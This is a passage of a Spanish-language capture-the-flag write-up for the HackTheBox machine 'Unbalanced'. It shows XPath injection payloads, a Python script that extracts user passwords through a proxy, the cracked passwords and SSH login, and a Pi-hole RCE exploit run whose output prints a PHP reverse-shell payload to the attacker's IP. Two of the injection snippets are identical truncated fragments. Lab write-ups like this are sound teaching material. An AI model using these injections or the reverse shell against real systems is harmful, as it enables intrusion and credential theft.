+<p>Parte de la respuesta:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>rita
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>Rita Fubelli
+<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>rita@unbalanced.htb
+<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>Role: HR Manager
+<a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>
+<a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>jim
+<a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a>Jim Mickelson
+<a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a>jim@unbalanced.htb
+<a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a>Role: Web Designer
+<a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a>
+<a id="__codelineno-10-11" name="__codelineno-10-11" href="#__codelineno-10-11"></a>bryan
+<a id="__codelineno-10-12" name="__codelineno-10-12" href="#__codelineno-10-12"></a>Bryan Angstrom
+<a id="__codelineno-10-13" name="__codelineno-10-13" href="#__codelineno-10-13"></a>bryan@unbalanced.htb
+<a id="__codelineno-10-14" name="__codelineno-10-14" href="#__codelineno-10-14"></a>Role: System Administrator
+<a id="__codelineno-10-15" name="__codelineno-10-15" href="#__codelineno-10-15"></a>
+<a id="__codelineno-10-16" name="__codelineno-10-16" href="#__codelineno-10-16"></a>sarah
+<a id="__codelineno-10-17" name="__codelineno-10-17" href="#__codelineno-10-17"></a>Sarah Goodman
+<a id="__codelineno-10-18" name="__codelineno-10-18" href="#__codelineno-10-18"></a>sarah@unbalanced.htb
+<a id="__codelineno-10-19" name="__codelineno-10-19" href="#__codelineno-10-19"></a>Role: Team Leader
+</code></pre></div>
+</li>
+</ul>
+<h2 id="xpath-injection-link-del-paper">XPATH injection - <a href="https://owasp.org/www-pdf-archive/HAAS_OWASP_NZ_13-Improving_XPath_Injection.pdf">Link del paper</a></h2>
+<ul>
+<li>
+<p>Similar la sintaxis a sql injection, esta injección da una respuesta de mas de 10000 kbytes, se puede ver todo el contenido de la tabla actual (nombres de usuario):</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>Username=sarah&amp;Password=vulnerable&#39;] | //*[&#39;1&#39;=&#39;1
+</code></pre></div>
+</li>
+<li>
+<p>Injeccion para ver la longitud del password</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>[position()=1]/child::node()[position()=2]),1,1)
+</code></pre></div>
+</li>
+<li>
+<p>Inyección para ver la primera letra del password:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>[position()=1]/child::node()[position()=2]),1,1)
+</code></pre></div>
+</li>
+<li>
+<p>Conociendo las inyecciones se crea un script en python para automatizar el ataque:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="ch">#!/usr/bin/python3</span>
+<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>
+<a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a><span class="kn">import</span> <span class="nn">pdb</span><span class="o">,</span> <span class="nn">string</span><span class="o">,</span> <span class="nn">requests</span>
+<a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a>
+<a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a><span class="k">def</span> <span class="nf">def_handler</span><span class="p">(</span><span class="n">sig</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span>
+<a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a>    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">[!] Saliendo ...&quot;</span><span class="p">)</span>
+<a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a>    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<a id="__codelineno-14-9" name="__codelineno-14-9" href="#__codelineno-14-9"></a>
+<a id="__codelineno-14-10" name="__codelineno-14-10" href="#__codelineno-14-10"></a><span class="n">url</span> <span class="o">=</span> <span class="s2">&quot;http://172.31.179.1/intranet.php&quot;</span>
+<a id="__codelineno-14-11" name="__codelineno-14-11" href="#__codelineno-14-11"></a><span class="n">proxy</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;http&#39;</span><span class="p">:</span> <span class="s1">&#39;http://10.10.10.200:3128&#39;</span><span class="p">}</span>
+<a id="__codelineno-14-12" name="__codelineno-14-12" href="#__codelineno-14-12"></a><span class="n">usuarios</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;rita&quot;</span><span class="p">,</span> <span class="s2">&quot;jim&quot;</span><span class="p">,</span> <span class="s2">&quot;bryan&quot;</span><span class="p">,</span> <span class="s2">&quot;sarah&quot;</span><span class="p">]</span>
+<a id="__codelineno-14-13" name="__codelineno-14-13" href="#__codelineno-14-13"></a><span class="n">characters</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">punctuation</span>
+<a id="__codelineno-14-14" name="__codelineno-14-14" href="#__codelineno-14-14"></a>
+<a id="__codelineno-14-15" name="__codelineno-14-15" href="#__codelineno-14-15"></a><span class="k">def</span> <span class="nf">getPassword</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">proxy</span><span class="p">):</span>
+<a id="__codelineno-14-16" name="__codelineno-14-16" href="#__codelineno-14-16"></a>    <span class="k">for</span> <span class="n">user</span> <span class="ow">in</span> <span class="n">usuarios</span><span class="p">:</span>
+<a id="__codelineno-14-17" name="__codelineno-14-17" href="#__codelineno-14-17"></a>        <span class="n">password</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+<a id="__codelineno-14-18" name="__codelineno-14-18" href="#__codelineno-14-18"></a>        <span class="k">for</span> <span class="n">position</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">30</span><span class="p">):</span>
+<a id="__codelineno-14-19" name="__codelineno-14-19" href="#__codelineno-14-19"></a>            <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">characters</span><span class="p">:</span>
+<a id="__codelineno-14-20" name="__codelineno-14-20" href="#__codelineno-14-20"></a>                <span class="n">payload</span> <span class="o">=</span> <span class="s2">&quot;test&#39; or Username=&#39;</span><span class="si">%s</span><span class="s2">&#39; and substring(Password,</span><span class="si">%d</span><span class="s2">,1)=&#39;</span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">user</span><span class="p">,</span> <span class="n">position</span><span class="p">,</span> <span class="n">char</span><span class="p">)</span>
+<a id="__codelineno-14-21" name="__codelineno-14-21" href="#__codelineno-14-21"></a>                <span class="n">post_data</span> <span class="o">=</span> <span class="p">{</span>
+<a id="__codelineno-14-22" name="__codelineno-14-22" href="#__codelineno-14-22"></a>                    <span class="s1">&#39;Username&#39;</span> <span class="p">:</span> <span class="s1">&#39;test&#39;</span><span class="p">,</span>
+<a id="__codelineno-14-23" name="__codelineno-14-23" href="#__codelineno-14-23"></a>                    <span class="s1">&#39;Password&#39;</span> <span class="p">:</span> <span class="n">payload</span>
+<a id="__codelineno-14-24" name="__codelineno-14-24" href="#__codelineno-14-24"></a>                    <span class="p">}</span>
+<a id="__codelineno-14-25" name="__codelineno-14-25" href="#__codelineno-14-25"></a>
+<a id="__codelineno-14-26" name="__codelineno-14-26" href="#__codelineno-14-26"></a>                <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="n">post_data</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxy</span><span class="p">)</span>
+<a id="__codelineno-14-27" name="__codelineno-14-27" href="#__codelineno-14-27"></a>                <span class="k">if</span> <span class="s2">&quot;Invalid credentials&quot;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+<a id="__codelineno-14-28" name="__codelineno-14-28" href="#__codelineno-14-28"></a>                <span class="c1">#print(r.text)</span>
+<a id="__codelineno-14-29" name="__codelineno-14-29" href="#__codelineno-14-29"></a>                    <span class="k">if</span> <span class="n">char</span> <span class="o">==</span> <span class="s2">&quot;&#39;&quot;</span><span class="p">:</span>
+<a id="__codelineno-14-30" name="__codelineno-14-30" href="#__codelineno-14-30"></a>                        <span class="k">break</span>
+<a id="__codelineno-14-31" name="__codelineno-14-31" href="#__codelineno-14-31"></a>                    <span class="n">password</span> <span class="o">=</span> <span class="n">password</span> <span class="o">+</span> <span class="n">char</span>
+<a id="__codelineno-14-32" name="__codelineno-14-32" href="#__codelineno-14-32"></a>                    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Posición </span><span class="si">%d</span><span class="s2">: &quot;</span> <span class="o">%</span> <span class="n">position</span> <span class="o">+</span> <span class="n">password</span><span class="p">)</span>
+<a id="__codelineno-14-33" name="__codelineno-14-33" href="#__codelineno-14-33"></a>                    <span class="k">break</span>
+<a id="__codelineno-14-34" name="__codelineno-14-34" href="#__codelineno-14-34"></a>            <span class="k">if</span> <span class="n">char</span> <span class="o">==</span> <span class="s2">&quot;&#39;&quot;</span><span class="p">:</span>
+<a id="__codelineno-14-35" name="__codelineno-14-35" href="#__codelineno-14-35"></a>                <span class="k">break</span>
+<a id="__codelineno-14-36" name="__codelineno-14-36" href="#__codelineno-14-36"></a>
+<a id="__codelineno-14-37" name="__codelineno-14-37" href="#__codelineno-14-37"></a>        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;La password del usuario </span><span class="si">%s</span><span class="s2"> es: &quot;</span> <span class="o">%</span> <span class="n">user</span> <span class="o">+</span> <span class="n">password</span><span class="p">)</span>
+<a id="__codelineno-14-38" name="__codelineno-14-38" href="#__codelineno-14-38"></a>
+<a id="__codelineno-14-39" name="__codelineno-14-39" href="#__codelineno-14-39"></a><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+<a id="__codelineno-14-40" name="__codelineno-14-40" href="#__codelineno-14-40"></a>    <span class="n">getPassword</span><span class="p">(</span><span class="n">url</span><span class="p">,</span>  <span class="n">proxy</span><span class="p">)</span>
+</code></pre></div>
+</li>
+<li>
+<p>Se obtienen los siguientes resultados:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>La password del usuario rita es: password01!
+<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>La password del usuario jim es: stairwaytoheaven
+<a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>La password del usuario bryan es: ireallyl0vebubblegum!!!
+<a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>La password del usuario sarah es: sarah4evah
+</code></pre></div>
+</li>
+</ul>
+<h2 id="explotation-intrusion">Explotation - Intrusion</h2>
+<ul>
+<li>
+<p>Viendo que las password obtenidas no dan ningún acceso por web, se prueba con el servicio SSH:</p>
+<blockquote>
+<p><code>ssh bryan@10.10.10.200</code></p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>bryan@10.10.10.200&#39;s password: 
+<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>Linux unbalanced 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64
+<a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>
+<a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a>The programs included with the Debian GNU/Linux system are free software;
+<a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a>the exact distribution terms for each program are described in the
+<a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a>individual files in /usr/share/doc/*/copyright.
+<a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a>
+<a id="__codelineno-16-8" name="__codelineno-16-8" href="#__codelineno-16-8"></a>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+<a id="__codelineno-16-9" name="__codelineno-16-9" href="#__codelineno-16-9"></a>permitted by applicable law.
+<a id="__codelineno-16-10" name="__codelineno-16-10" href="#__codelineno-16-10"></a>Last login: Wed Jun 17 14:16:06 2020 from 10.10.10.4
+<a id="__codelineno-16-11" name="__codelineno-16-11" href="#__codelineno-16-11"></a>-bash: warning: setlocale: LC_ALL: cannot change locale (es_ES.UTF-8)
+<a id="__codelineno-16-12" name="__codelineno-16-12" href="#__codelineno-16-12"></a>bryan@unbalanced:~$ cat user.txt 
+<a id="__codelineno-16-13" name="__codelineno-16-13" href="#__codelineno-16-13"></a>4af2cbfd2c0dabcf8af24369b936d00e
+</code></pre></div>
+</li>
+<li>
+<p>Se puede ver que han montado un contenedor de docker con Pi-Hole con password de admin temporal por defecto, y se crea un Local Port Fordwarding con SSH para acceder:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>bryan@unbalanced:~$ cat TODO 
+<a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>############
+<a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a># Intranet #
+<a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a>############
+<a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a>* Install new intranet-host3 docker [DONE]
+<a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a>* Rewrite the intranet-host3 code to fix Xpath vulnerability [DONE]
+<a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a>* Test intranet-host3 [DONE]
+<a id="__codelineno-17-8" name="__codelineno-17-8" href="#__codelineno-17-8"></a>* Add intranet-host3 to load balancer [DONE]
+<a id="__codelineno-17-9" name="__codelineno-17-9" href="#__codelineno-17-9"></a>* Take down intranet-host1 and intranet-host2 from load balancer (set as quiescent, weight zero) [DONE]
+<a id="__codelineno-17-10" name="__codelineno-17-10" href="#__codelineno-17-10"></a>* Fix intranet-host2 [DONE]
+<a id="__codelineno-17-11" name="__codelineno-17-11" href="#__codelineno-17-11"></a>* Re-add intranet-host2 to load balancer (set default weight) [DONE]
+<a id="__codelineno-17-12" name="__codelineno-17-12" href="#__codelineno-17-12"></a>- Fix intranet-host1 [TODO]
+<a id="__codelineno-17-13" name="__codelineno-17-13" href="#__codelineno-17-13"></a>- Re-add intranet-host1 to load balancer (set default weight) [TODO]
+<a id="__codelineno-17-14" name="__codelineno-17-14" href="#__codelineno-17-14"></a>
+<a id="__codelineno-17-15" name="__codelineno-17-15" href="#__codelineno-17-15"></a>###########
+<a id="__codelineno-17-16" name="__codelineno-17-16" href="#__codelineno-17-16"></a># Pi-hole #
+<a id="__codelineno-17-17" name="__codelineno-17-17" href="#__codelineno-17-17"></a>###########
+<a id="__codelineno-17-18" name="__codelineno-17-18" href="#__codelineno-17-18"></a>* Install Pi-hole docker (only listening on 127.0.0.1) [DONE]
+<a id="__codelineno-17-19" name="__codelineno-17-19" href="#__codelineno-17-19"></a>* Set temporary admin password [DONE]
+<a id="__codelineno-17-20" name="__codelineno-17-20" href="#__codelineno-17-20"></a>* Create Pi-hole configuration script [IN PROGRESS]
+<a id="__codelineno-17-21" name="__codelineno-17-21" href="#__codelineno-17-21"></a>- Run Pi-hole configuration script [TODO]
+<a id="__codelineno-17-22" name="__codelineno-17-22" href="#__codelineno-17-22"></a>- Expose Pi-hole ports to the network [TODO]
+<a id="__codelineno-17-23" name="__codelineno-17-23" href="#__codelineno-17-23"></a>
+<a id="__codelineno-17-24" name="__codelineno-17-24" href="#__codelineno-17-24"></a>bryan@unbalanced:~$ ss -tuna | grep 127.0.0.1
+<a id="__codelineno-17-25" name="__codelineno-17-25" href="#__codelineno-17-25"></a>udp   UNCONN    0      0                  127.0.0.1:5553                0.0.0.0:*                                                                               
+<a id="__codelineno-17-26" name="__codelineno-17-26" href="#__codelineno-17-26"></a>tcp   LISTEN    0      128                127.0.0.1:8080                0.0.0.0:*                                                                               
+<a id="__codelineno-17-27" name="__codelineno-17-27" href="#__codelineno-17-27"></a>tcp   LISTEN    0      128                127.0.0.1:5553                0.0.0.0:*          
+</code></pre></div>
+</li>
+<li>
+<p>Tras acceder se puede ver un leak de ip interna de Pi-Hole, y accedemos a través del SquidProxy:</p>
+<p><img alt="" src="../images/pihole.png" /></p>
+</li>
+</ul>
+<h2 id="escalado-de-privilegios">Escalado de Privilegios</h2>
+<ul>
+<li>
+<p>Tras acceder al panel de pihole con la contraseña "admin", comprobamos que tiene la version 4.3.2 vulnerable a RCE, la cual permite acceder con una shell reversa:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>python pihole.py -u http://localhost -i 10.10.14.11 -p 443 -pass admin
+<a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>╔═╗┬ ┬┌┐┌  ╔═╗┬┬ ┬┌─┐┬  ┌─┐
+<a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>╠═╝││││││  ╠═╝│├─┤│ ││  ├┤
+<a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a>╩  └┴┘┘└┘  ╩  ┴┴ ┴└─┘┴─┘└─┘
+<a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a>      by @CyberVaca
+<a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a>
+<a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a>[+] Token: rymbP9XshULuGsr7p9DWQ1wRocuKIQ0M5r29qSmU1lA=
+<a id="__codelineno-18-8" name="__codelineno-18-8" href="#__codelineno-18-8"></a>[+] Payload: php -r &#39;$sock=fsockopen(&quot;10.10.14.11&quot;, 443);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;
+<a id="__codelineno-18-9" name="__codelineno-18-9" href="#__codelineno-18-9"></a>[+] Sending Payload...
+</code></pre></div>
+</li>
+<li>
+<p>Se puede observar una password en la configuración de un fichero, es uno de los scripts indicados en TODO pendientes de terminar:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>www-data@pihole:/root$ cat pihole_config.sh 
+<a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>#!/bin/bash
+<a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>
+<a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a># Add domains to whitelist
+<a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a>/usr/local/bin/pihole -w unbalanced.htb
+<a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a>/usr/local/bin/pihole -w rebalanced.htb
+<a id="__codelineno-19-7" name="__codelineno-19-7" href="#__codelineno-19-7"></a>
+<a id="__codelineno-19-8" name="__codelineno-19-8" href="#__codelineno-19-8"></a># Set temperature unit to Celsius
+<a id="__codelineno-19-9" name="__codelineno-19-9" href="#__codelineno-19-9"></a>/usr/local/bin/pihole -a -c
+<a id="__codelineno-19-10" name="__codelineno-19-10" href="#__codelineno-19-10"></a>
+<a id="__codelineno-19-11" name="__codelineno-19-11" href="#__codelineno-19-11"></a># Add local host record
+<a id="__codelineno-19-12" name="__codelineno-19-12" href="#__codelineno-19-12"></a>/usr/local/bin/pihole -a hostrecord pihole.unbalanced.htb 127.0.0.1
+<a id="__codelineno-19-13" name="__codelineno-19-13" href="#__codelineno-19-13"></a>
+<a id="__codelineno-19-14" name="__codelineno-19-14" href="#__codelineno-19-14"></a># Set privacy level
+<a id="__codelineno-19-15" name="__codelineno-19-15" href="#__codelineno-19-15"></a>/usr/local/bin/pihole -a -l 4
+<a id="__codelineno-19-16" name="__codelineno-19-16" href="#__codelineno-19-16"></a>
+<a id="__codelineno-19-17" name="__codelineno-19-17" href="#__codelineno-19-17"></a># Set web admin interface password
+<a id="__codelineno-19-18" name="__codelineno-19-18" href="#__codelineno-19-18"></a>/usr/local/bin/pihole -a -p &#39;bUbBl3gUm$43v3Ry0n3!&#39;
+<a id="__codelineno-19-19" name="__codelineno-19-19" href="#__codelineno-19-19"></a>
+<a id="__codelineno-19-20" name="__codelineno-19-20" href="#__codelineno-19-20"></a># Set admin email
+<a id="__codelineno-19-21" name="__codelineno-19-21" href="#__codelineno-19-21"></a>/usr/local/bin/pihole -a email admin@unbalanced.htb
+</code></pre></div>
+</li>
+<li>
+<p>Nos convertimos en root desde la conexión de la máquina unbalanced:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>bryan@unbalanced:~$ su root
+<a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>Password: 
+<a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>bash: warning: setlocale: LC_ALL: cannot change locale (es_ES.UTF-8)
+<a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a>root@unbalanced:/home/bryan# cat /root/root.txt 
+<a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a>cdd1ad3640b91e14500e2d627256dfa3
+</code></pre></div>
+</li>
+</ul>
+
+              
+            </article>
+            
+          </div>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+    <nav class="md-footer__inner md-grid" aria-label="Footer" >
+      
+        
+        <a href="../pressed/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Pressed" rel="prev">
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+          </div>
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              Pressed
+            </div>
+          </div>
+        </a>
+      
+      
+        
+        <a href="../validation/" class="md-footer__link md-footer__link--next" aria-label="Next: Validation" rel="next">
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              Validation
+            </div>
+          </div>
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4Z"/></svg>
+          </div>
+        </a>
+      
+    </nav>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    <script id="__config" type="application/json">{"base": "../../..", "features": ["toc.integrate"], "search": "../../../assets/javascripts/workers/search.b97dbffb.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version.title": "Select version"}}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.6c7ad80a.min.js"></script>
+      
+    
+  </body>
+</html>
